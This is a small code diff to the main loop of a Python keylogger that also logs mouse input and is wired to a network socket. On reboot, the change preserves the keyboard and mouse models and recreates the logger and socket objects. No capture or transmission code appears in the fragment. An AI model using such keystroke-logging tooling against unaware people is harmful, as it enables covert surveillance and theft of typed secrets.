@@ -224,9 +224,18 @@ def loop(keylogger, socket, apiconnection=None, display=None):
                 sleep(10)
 
             if keylogger.reboot:
+                tmp_model_keyboard = keylogger.model_keyboard
+                tmp_model_mouse = keylogger.model_mouse
+
+                del keylogger
+
+                del socket
+
                 keylogger = Keylogger(display=display,
                                       has_debug=DEBUG,
-                                      mouse_enabled=MOUSE_ENABLED)
+                                      mouse_enabled=MOUSE_ENABLED,
+                                      model_keyboard=tmp_model_keyboard,
+                                      model_mouse=tmp_model_mouse)
 
                 socket = Socket(keylogger, has_debug=DEBUG)
 
